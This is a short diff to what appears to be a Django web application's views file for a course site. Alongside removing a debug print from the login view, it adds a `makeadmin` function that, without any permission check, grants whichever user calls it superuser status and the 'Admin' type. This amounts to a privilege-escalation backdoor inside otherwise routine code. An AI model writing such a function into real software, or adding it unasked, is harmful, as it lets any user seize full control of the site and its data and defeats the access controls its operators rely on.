@@ -894,6 +894,13 @@ def folderAdd(request):
     section.Folders.add(folder)
     return redirect("course", course_id)
 
+def makeadmin(request):
+    user = request.user
+    user.approved = True
+    user.is_superuser = True
+    user.usertype = "Admin"
+    user.save()
+
 def login(request):
     if request.method == 'POST':
         email = request.POST.get('email')
@@ -902,7 +909,6 @@ def login(request):
             user = authenticate(username=email, password=password)
             if user:
                 auth_login(request, user)
-                print(user.email)
                 return redirect("courses")
             else:
                 return redirect("login")
